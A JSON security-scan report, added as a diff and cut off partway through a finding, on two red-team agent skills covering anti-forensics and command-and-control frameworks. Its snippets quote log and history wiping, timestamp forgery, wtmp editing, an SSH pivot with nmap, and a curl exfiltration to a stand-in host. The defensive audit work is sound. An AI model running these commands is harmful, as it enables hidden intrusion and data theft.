@@ -1,0 +1,1819 @@
+{
+  "multi_skill": true,
+  "skill_count": 2,
+  "max_risk_score": 100,
+  "risk_severity": "CRITICAL",
+  "execution_successful": true,
+  "risk_recommendation": "DO_NOT_INSTALL",
+  "analysis_completeness": {
+    "is_complete": true,
+    "execution_successful": true,
+    "status": "complete",
+    "coverage_percent": 100.0,
+    "fully_inspected_files": 2,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "total_files": 2,
+    "limitations": [],
+    "scope": "recursive_skills"
+  },
+  "skills_scanned": 2,
+  "skills_omitted": 0,
+  "skills_output_omitted": 0,
+  "public_finding_records": 10,
+  "report_characters": 60567,
+  "transitive_finding_count": 0,
+  "transitive_sources": [],
+  "skills": [
+    {
+      "name": "offensive-anti-forensics",
+      "path": "offensive-anti-forensics",
+      "risk_score": 100,
+      "risk_severity": "CRITICAL",
+      "finding_count": 8,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-anti-forensics",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/forensics/offensive-anti-forensics",
+        "scanned_at": "2026-11-13T11:39:46.011777+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO_NOT_INSTALL",
+        "max_issue_severity": "CRITICAL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 467,
+          "executable": false,
+          "size_bytes": 19476,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "YR1",
+          "finding_id": "finding-ed4a21dacd284dd5830a0202603f09ed",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'c2_framework_indicators': Command-and-control framework indicators (Cobalt Strike, Metasploit, Sliver, etc.) [malware]",
+          "severity": "CRITICAL",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 207,
+            "end_line": null
+          },
+          "finding": "Meterpreter; meterpreter",
+          "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+          "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+          "code_snippet": "astWriteTime = \"01/15/2025 08:30:00\"\n$file.LastAccessTime = \"01/15/2025 08:30:00\"\n\n# Match timestamps to a legitimate system file\n$ref = Get-Item C:\\Windows\\System32\\notepad.exe\n$target = Get-Item C:\\Windows\\Temp\\payload.exe\n$target.CreationTime = $ref.CreationTime\n$target.LastWriteTime = $ref.LastWriteTime\n$target.LastAccessTime = $ref.LastAccessTime\n```\n\n```powershell\n# Metasploit Timestomp via Meterpreter\n# meterpreter> timestomp C:\\\\Windows\\\\Temp\\\\payload.exe -f C:\\\\Windows\\\\System32\\\\notepad.exe\n# This copies all MACE values from notepad.exe to your payload\n\n# SetMACE via direct NTFS manipulation (bypasses standard API logging)\n# Requires raw NTFS access -- tools like SetMACE modify $STANDARD_INFORMATION\n# and $FILE_NAME attributes in the MFT directly\n```\n\n### Linux Timestamp Manipulation\n\n```bash\n# Set specific timestamps using touch\ntouch -t 202501150830.00 /tmp/payload\ntouch -a -t 202501150830.00 /tmp/payload  # access time only\ntouch -m -t 202501150830.00 /tmp/payload  # modif",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "3adf653a7816ff53bf8916dd8d2fa7a476b23f5e5ad5abe823bf08619cdb47cb",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 207,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM1",
+          "finding_id": "finding-08b133657dd54de1a45f73ffbb8fa9ec",
+          "category": "Tool Misuse",
+          "pattern": "Tool Parameter Abuse",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 140,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "rm -rf /",
+          "explanation": "Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns).",
+          "remediation": "Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.",
+          "code_snippet": "journalctl --vacuum-time=1s\n\n# Alternative: remove journal files directly\nrm -rf /var/log/journal/*\nsystemctl restart systemd-journald\n\n# Selective approach: vacuum to a small size to keep recent benign entries",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "f3ff4d6cfbe1b7f6b23dd4d1379edae984c14738c5f5b14db40e215beb673f08",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 140,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM1",
+          "finding_id": "finding-67ce2517253944cf9dc20026e7cfa7ff",
+          "category": "Tool Misuse",
+          "pattern": "Tool Parameter Abuse",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 140,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "rm -rf /var/log/journal/*",
+          "explanation": "Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns).",
+          "remediation": "Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.",
+          "code_snippet": "journalctl --vacuum-time=1s\n\n# Alternative: remove journal files directly\nrm -rf /var/log/journal/*\nsystemctl restart systemd-journald\n\n# Selective approach: vacuum to a small size to keep recent benign entries",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "bcba2ba61b522616d0966ead13245bfabfb62e5c3bbe4a392b7fe07d7cd7393c",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 140,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM1",
+          "finding_id": "finding-68781e1feda14a04b75d3c83cc692b28",
+          "category": "Tool Misuse",
+          "pattern": "Tool Parameter Abuse",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 180,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "rm /tmp/wtmp.txt",
+          "explanation": "Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns).",
+          "remediation": "Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.",
+          "code_snippet": "utmpdump /var/log/wtmp > /tmp/wtmp.txt\ngrep -v \"your_username\" /tmp/wtmp.txt > /tmp/wtmp_clean.txt\nutmpdump -r < /tmp/wtmp_clean.txt > /var/log/wtmp\nrm /tmp/wtmp.txt /tmp/wtmp_clean.txt\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "ce27bb25accc9006c20c818128f8687d9aa945c81de9d82a9e7b9e6efaec3df0",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 180,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM1",
+          "finding_id": "finding-99125ebbc37a4ef0b06067625b699a32",
+          "category": "Tool Misuse",
+          "pattern": "Tool Parameter Abuse",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 278,
+            "end_line": null,
+            "start_column": 56
+          },
+          "finding": "rm /tmp/wipe_free",
+          "explanation": "Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns).",
+          "remediation": "Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.",
+          "code_snippet": "shred -u /tmp/payload\n\n# Overwrite free space on a partition\ndd if=/dev/urandom of=/tmp/wipe_free bs=1M 2>/dev/null; rm /tmp/wipe_free\nsync\n\n# For SSDs, TRIM complicates recovery but does not guarantee destruction",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "adddd3b563b2f1da3f00a6043d76e53fe0a50d2a32782322da2c2d68d6ded0ad",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 278,
+              "end_line": null,
+              "start_column": 56
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM1",
+          "finding_id": "finding-e441870337bb40fba348b7fed16a8e08",
+          "category": "Tool Misuse",
+          "pattern": "Tool Parameter Abuse",
+          "severity": "HIGH",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 335,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "rm -f ~/.bash_history",
+          "explanation": "Tool parameters are crafted to achieve unintended or unsafe behavior. Parameter abuse can bypass intended safety checks (e.g. shell=True, --force, dangerous glob patterns).",
+          "remediation": "Validate all tool parameters against an allowlist. Reject dangerous parameter values (shell=True, --force, -rf /) and use safe defaults.",
+          "code_snippet": "unset HISTFILE\nexport HISTSIZE=0\nhistory -c\nrm -f ~/.bash_history\n\n# Prevent history writing for the session\nset +o history",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "75140d29cafc56850b6fe1ad3d2c9944d81b0afddb876de14e3c032136c3be50",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 335,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-05a5e3952b354c69bea80815b8da81c2",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'offensive_tool_references': References to well-known offensive security tools [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 369,
+            "end_line": null
+          },
+          "finding": "nmap -s",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
+          "code_snippet": " domains via DoH\ndoh_resolvers:\n  - https://cloudflare-dns.com/dns-query\n  - https://dns.google/dns-query\n\n# Encapsulate C2 in HTTPS to blend with legitimate web traffic\n# Use domain fronting or legitimate CDN endpoints\n# See offensive-c2-frameworks skill for detailed C2 traffic shaping\n```\n\n```bash\n# SSH tunneling to encrypt lateral movement traffic\nssh -D 9050 -f -N pivot@10.10.10.5\nproxychains nmap -sT 172.16.0.0/24\n\n# Encrypt exfiltrated data before transfer\ntar czf - /sensitive/data | openssl enc -aes-256-cbc -pbkdf2 -pass pass:ExfilKey | \\\n    curl -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- https://exfil.example.com/upload\n```\n\n---\n\n## Anti-VM and Sandbox Detection\n\nMalware sandboxes and forensic analysis VMs have detectable characteristics. During red team engagements, you may need your payloads to behave differently -- or not at all -- in analysis environments.\n\n```csharp\n// Common VM detection checks\nusing System.Management;\n\npublic static bool IsVirt",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "eda6d6ebb8f29faca2612cddaee0a99c6f99138cbaeb084b38c2ae2a277e935e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 369,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-047ec33fc279441aa227bf5972bb75cc",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 373,
+            "end_line": null,
+            "start_column": 4
+          },
+          "finding": "curl -X POST -H \"Content-Type: application/octet-stream\" --data-binary ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n# Encrypt exfiltrated data before transfer\ntar czf - /sensitive/data | openssl enc -aes-256-cbc -pbkdf2 -pass pass:ExfilKey | \\\n    curl -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- https://exfil.example.com/upload\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "825e6d91a1bd5e8c52e9e0c51902ed33171841d821c937da45e74f281c9af91d",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 373,
+              "end_line": null,
+              "start_column": 4
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 77,
+            "end_line": 77,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 80,
+            "end_line": 80,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 154,
+            "end_line": 154,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 323,
+            "end_line": 323,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 77,
+            "column": 13,
+            "evidence": "[DllImport(\"kernel32.dll\")]",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 80,
+            "column": 33,
+            "evidence": "IntPtr ntdll = GetModuleHandle(\"ntdll.dll\");",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 154,
+            "column": 11,
+            "evidence": "* Usage: ./utmp_editor /var/log/wtmp username_to_remove */",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 323,
+            "column": 42,
+            "evidence": "[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "markdown_link"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 8,
+        "findings_after_filtering": 8,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    },
+    {
+      "name": "offensive-c2-frameworks",
+      "path": "offensive-c2-frameworks",
+      "risk_score": 62,
+      "risk_severity": "HIGH",
+      "finding_count": 2,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-c2-frameworks",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/forensics/offensive-c2-frameworks",
+        "scanned_at": "2026-11-13T11:39:46.504992+00:00"
+      },
+      "risk_assessment": {
+        "score": 62,
+        "severity": "HIGH",
+        "recommendation": "DO_NOT_INSTALL",
+        "max_issue_severity": "CRITICAL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 596,
+          "executable": false,
+          "size_bytes": 22356,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "YR1",
+          "finding_id": "finding-958788d3a7c34a51819fab12221398af",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'c2_framework_indicators': Command-and-control framework indicators (Cobalt Strike, Metasploit, Sliver, etc.) [malware]",
+          "severity": "CRITICAL",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 3,
+            "end_line": null
+          },
+          "finding": "cobaltstrike; Meterpreter; meterpreter; meterpreter; Meterpreter; meterpreter; meterpreter; meterpreter; meterpreter; meterpreter; Meterpreter; meterpreter; meterpreter; meterpreter; meterpreter; mete",
+          "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+          "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+          "code_snippet": "---\nname: offensive-c2-frameworks\ndescription: \"Command and Control framework deployment, configuration, and operational tradecraft for red team engagements. Covers Cobalt Strike (malleable C2 profiles, Beacon types HTTP/HTTPS/DNS/SMB, Beacon Object Files for in-memory execution, sleep and jitter tuning, named pipe pivoting), Sliver (implant generation across mTLS/WireGuard/DNS transport, operator multiplayer mode, armory extensions), Mythic (agent ecosystem with Apollo/Poseidon/Medusa, C2 profile configuration, translation containers), Havoc (Demon agent with sleep obfuscation via Ekko/Zilean, indirect syscalls, dotnet inline execution), Metasploit (msfvenom payload generation, multi/handler staging, Meterpreter post-exploitation modules), redirector architecture using Apache mod_rewrite and Nginx, domain fronting through CDN providers, DNS-based C2 for restrictive network egress, and TLS certificate management fo",
+          "intent": null,
+          "tags": [
+            "YARA Match"
+          ],
+          "evidence": {},
+          "match_fingerprint": "374dd126f554a5c23064f08de3c4c754b21624c633e51cb8e3d37da9d75dc4eb",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 3,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "YR4",
+          "finding_id": "finding-a0cef0ec5bd347c0a8e1da2d0415fcbf",
+          "category": "YARA Match",
+          "pattern": "YARA rule 'exploit_framework': Exploit framework components and payloads [hacktools]",
+          "severity": "HIGH",
+          "confidence": 0.8,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 368,
+            "end_line": null
+          },
+          "finding": "msfvenom -p ; msfvenom -p ; msfvenom -p ; msfvenom -p ",
+          "explanation": "YARA rule matched a hack tool or exploit indicator (offensive tools, reconnaissance, privilege escalation, or exploit frameworks).",
+          "remediation": "Remove offensive tool references and exploit code. Legitimate agent skills should not contain penetration testing tools, exploit frameworks, or reconnaissance utilities.",
